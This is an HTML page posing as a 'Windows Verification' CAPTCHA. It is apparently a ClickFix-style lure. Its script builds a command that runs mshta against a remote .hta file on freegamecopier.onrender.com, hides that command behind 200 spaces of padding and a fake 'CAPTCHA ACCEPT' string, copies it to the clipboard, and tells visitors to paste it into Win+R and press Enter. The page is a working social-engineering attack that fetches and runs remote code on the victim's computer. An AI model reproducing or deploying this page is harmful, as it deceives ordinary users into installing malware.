<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Windows Verification</title>
  <style>
    body {
      background: #111;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    .cmd {
      background: #222;
      padding: 10px;
      margin: 20px auto;
      border-radius: 8px;
      display: inline-block;
      font-family: monospace;
      font-size: 0.95rem;
      user-select: all;
      max-width: 90%;
      word-break: break-word;
    }
    .btn {
      background: #5865F2;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin: 10px;
    }
    .btn:hover { background: #4752c4; }
  </style>
</head>
<body>
  <h2>Windows Verification</h2>
  <p>Press <b>Win + R</b>, then <b>Ctrl + V</b>, then <b>Enter</b>:</p>
  <div class="cmd" id="cmdText"></div>
  <button class="btn" onclick="copyCommand()">Copy</button>
  <button class="btn" onclick="checkVerification()">Done</button>
  <button class="btn" onclick="window.location.href='/'">Back to Home</button>
  <div id="verifyMsg" style="margin-top:10px;"></div>

  <script>
    function generateCode() {
      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      let code = "";
      for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
      code += "-";
      for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
      return code;
    }

    const verificationCode = generateCode();
    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta?code=${verificationCode}${" ".repeat(200)}CAPTCHA ACCEPT — Code: ${verificationCode}`;

    document.getElementById("cmdText").innerText = fullCommand;

    function copyCommand() {
      navigator.clipboard.writeText(fullCommand).then(() => {
        alert("Copied to clipboard!");
      }).catch(() => {
        alert("Clipboard access blocked — copy manually.");
      });
    }

    function checkVerification() {
      navigator.clipboard.readText().then(text => {
        if (text.includes(verificationCode)) {
          localStorage.setItem("tokenGateVerified", "1");
          document.getElementById("verifyMsg").style.color = "#4CAF50";
          document.getElementById("verifyMsg").innerText = "✅ Verified!";
          setTimeout(() => window.location.href = "/verifynotwindows", 1000);
        } else {
          document.getElementById("verifyMsg").style.color = "#ff4d4d";
          document.getElementById("verifyMsg").innerText = "❌ Verification failed. Clipboard doesn't match.";
        }
      }).catch(() => {
        alert("Failed to read clipboard. Try again.");
      });
    }
  </script>
</body>
</html>
